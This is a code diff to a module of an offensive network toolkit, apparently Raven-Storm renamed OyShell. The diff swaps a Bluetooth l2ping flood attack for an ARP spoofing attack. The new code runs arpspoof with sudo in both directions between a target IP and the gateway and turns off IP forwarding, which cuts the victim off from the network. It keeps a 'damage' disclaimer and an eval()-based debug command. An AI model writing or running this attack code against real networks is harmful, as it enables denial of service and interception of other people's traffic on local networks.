@@ -1,7 +1,7 @@
 # 2020
-# The Raven-Storm Toolkit was programmed and developed by Taguar258.
-# The Raven-Storm Toolkit is published under the MIT Licence.
-# The Raven-Storm Toolkit is based on the CLIF-Framework.
+# The OyShell Toolkit was programmed and developed by Taguar258.
+# The OyShell Toolkit is published under the MIT Licence.
+# The OyShell Toolkit is based on the CLIF-Framework.
 # The CLIF-Framework is programmed and developed by Taguar258.
 # The CLIF-Framework is published under the MIT Licence.
 
@@ -16,6 +16,7 @@ from CLIF_Framework.framework import tools  # noqa: I900
 
 try:
 	from os import geteuid
+
 	geteuid_exists = True
 except ImportError:
 	geteuid_exists = False
@@ -41,14 +42,12 @@ class Main:
 		var.C_Dark_Blue = "\x1b[35m"
 		var.C_Red = "\x1b[31m"
 
-		var.interface = "hci0"
-		var.threads = 1000
-		var.size = 600
-		var.sleep = 0
+		var.interface = "eth0"
 		var.target = ""
-		# var.interval = 0
+		var.gateway = "192.168.0.1"
 
-		var.bl_debug = False
+		var.ip_forwarding_default = 1
+		var.arp_debug = False
 
 	def _add_commands(self):
 		event.commands(self.exit_console, ["exit", "quit", "e", "q"])
@@ -60,20 +59,23 @@ class Main:
 
 		event.help(["values", "ls"], "Show all options.")
 
-		event.help("scan", "Scan for targets.")
-		event.help("target", "Target a BL MAC adress.")
-		event.help("threads", "Amount of threads to use.")
-		event.help("size", "Size of the packets.")
-		event.help("sleep", "Delay between threads.")
-		# event.help("interval", "Delay between each packet send.")
+		event.help("gateway", "Set your gateway.")
+		event.help("target", "Target a local ip.")
 		event.help("interface", "Set the interface you would like to use.")
-		event.help("run", "Run the stress test.")
+
+		event.help("run", "Run the test.")
 
 	def banner(self):
 		system("clear || cls")
 
-		if "/" not in popen("command -v hcitool").read() or "/" not in popen("command -v l2ping").read():
-			input("\n[i] Please install Bluez to continue.\n[Press Enter to continue]")
+		if "/" not in popen("command -v arpspoof").read():
+			input("\n[i] Please install DSniff to continue.\n[Press Enter to continue]")
+			system("clear || cls")
+			var.stop()
+			return
+
+		if "/" not in popen("command -v sysctl").read():
+			input("\n[i] Sysctl does not exist, this attack will not work.\n[Press Enter to continue]")
 			system("clear || cls")
 			var.stop()
 			return
@@ -84,6 +86,8 @@ class Main:
 				system("clear || cls")
 				var.stop()
 				return
+
+		var.ip_forwarding_default = popen("sudo sysctl net.ipv4.ip_forward").read().replace("net.ipv4.ip_forward = ", "")
 
 		print(("""C_B----------------------------------------------------------C_W
 THE CREATOR DOES NOT TAKE ANY RESPONSIBILITY FOR DAMAGE CAUSED.
@@ -110,6 +114,12 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		print("")
 		eval(tools.arg("Enter debug command: ", "$ ", command))
 		print("")
+
+	def ip_forward_disable(self):
+		system("sudo sysctl -w net.ipv4.ip_forward=0")
+
+	def ip_forward_reset(self):
+		system("sudo sysctl -w net.ipv4.ip_forward=%s" % var.ip_forwarding_default)
 
 	@event.command
 	def clear():
@@ -168,7 +178,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 
 	@event.command
 	def debug():
-		var.bl_debug = True
+		var.arp_debug = True
 		print("")
 		print("Debugging mode enabled.")
 		print("")
@@ -176,23 +186,29 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def show_values(self):
 		print("")
 		print("Interface: %s" % var.interface)
-		print("Threads: %s" % var.threads)
-		print("Site of packets: %s" % var.size)
-		print("Sleep between thread: %s" % var.sleep)
 		print("Target: %s" % var.target)
+		print("Gateway: %s" % var.gateway)
 		print("")
 
 	def help(self):
-		event.help_title("\x1b[1;39mBLE Help:\x1b[0;39m")
+		event.help_title("\x1b[1;39mARP Help:\x1b[0;39m")
 		tools.help("|-- ", " :: ", event)
 		print("")
 
 	@event.command
 	def target(command):
 		print("")
-		var.target = tools.arg("MAC: ", "target ", command)
-		if ":" not in var.target:
-			print("This MAC is invalid.")
+		var.target = tools.arg("IP: ", "target ", command)
+		if "." not in var.target:
+			print("This IP is invalid.")
+		print("")
+
+	@event.command
+	def gateway(command):
+		print("")
+		var.gateway = tools.arg("IP: ", "gateway ", command)
+		if "." not in var.gateway:
+			print("This IP is invalid.")
 		print("")
 
 	@event.command
@@ -201,52 +217,21 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		var.interface = tools.arg("Interface: ", "interface ", command)
 		print("")
 
-	@event.command
-	def size(command):
-		print("")
+	def arp_target(self):
 		try:
-			var.size = int(tools.arg("Size: ", "size ", command))
-		except Exception as e:
-			print("There was an error while executing.", e)
-		print("")
-
-	@event.command
-	def threads(command):
-		print(" ")
-		try:
-			var.threads = int(tools.arg("Threads: ", "threads ", command))
-		except Exception as e:
-			print("There was an error while executing.", e)
-		print(" ")
-
-	@event.command
-	def sleep(command):
-		print(" ")
-		try:
-			var.sleep = float(tools.arg("Delay between each thread: ", "sleep ", command))
-		except Exception as e:
-			print("There was an error while executing.", e)
-		print(" ")
-
-	@event.command
-	def scan(command):
-		try:
-			system("hcitool scan")
+			system("sudo arpspoof -i %s -t %s %s &" % (var.interface, var.target, var.gateway))
+			var.command_log.append("Sucessful execution.")
 		except Exception as ex:
 			var.command_log.append("ERROR: %s" % ex)
 			print("ERROR: %s" % ex)
 
-	# @event.command
-	# def interval(command):
-	# 	print(" ")
-	# 	try:
-	# 		var.interval = float(tools.arg("Delay between each packet: ", "interval ", command))
-	# 	except Exception as e:
-	# 		print("There was an error while executing.", e)
-	# 	print(" ")
-
-	def ddos(self):
-		system("sudo l2ping -i %s -s %s -f %s &" % (var.interface, var.size, var.target))
+	def arp_router(self):
+		try:
+			system("sudo arpspoof -i %s -t %s %s &" % (var.interface, var.gateway, var.target))
+			var.command_log.append("Sucessful execution.")
+		except Exception as ex:
+			var.command_log.append("ERROR: %s" % ex)
+			print("ERROR: %s" % ex)
 
 	@event.command
 	def run():
@@ -258,20 +243,34 @@ C_B----------------------------------------------------------C_W""").replace("C_
 			var.ps1 = ""  # Change due to threading bug.
 
 			sleep(3)
-			for thread in range(var.threads):
-				try:
-					t = Thread(target=self.ddos)
+			print("Seting ip_forward to 0...")
+			self.ip_forward_disable()
+			print("")
+			try:
+				for target in [self.arp_target, self.arp_router]:
+					t = Thread(target=target)
 					t.start()
-					sleep(var.sleep)
-				except Exception:
-					print("Could not start thread %s." % thread)
+			except Exception:
+				print("Could not start the attack.")
 
 			def reset_attack():
 				print("Stopping threads...")
-				system("sudo killall l2ping")
-				if var.bl_debug:
+				system("sudo killall -SIGINT arpspoof")
+				sleep(2)
+				while True:
+					out_exec = popen("pgrep arpspoof").read()
+					do_break = True
+					for char in str(out_exec):
+						if char.isdigit():
+							do_break = False
+					if do_break:
+						break
+					sleep(2)
+
+				self.ip_forward_reset()
+				if var.arp_debug:
 					print("Saving debugging log...")
-					output_to = path.join(getcwd(), "bl_debug_log.txt")
+					output_to = path.join(getcwd(), "arp_debug_log.txt")
 
 					write_method = "a"
 					if path.isfile(output_to):
@@ -346,5 +345,5 @@ C_B----------------------------------------------------------C_W""").replace("C_
 
 
 def setup(console):
-	console.ps1 = "BL> "
+	console.ps1 = "ARP> "
 	console.add(Main(console), event)
